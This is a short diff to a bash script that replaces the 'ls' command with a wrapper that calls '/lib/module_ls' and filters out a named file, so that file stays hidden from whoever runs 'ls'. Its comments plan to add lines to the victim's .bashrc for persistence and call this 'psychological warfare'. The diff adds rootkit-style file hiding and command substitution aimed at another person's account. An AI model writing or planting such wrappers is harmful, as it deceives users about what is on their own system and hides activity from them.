@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # Execute real 'ls' command and hide files
-command ls | grep -v FILE_TO_HIDE_HERE
+/lib/module_ls $@ | grep -v FILE_TO_HIDE_HERE
 
 # Add lines to their .bashrc
 # Every good script needs some psychological warfare
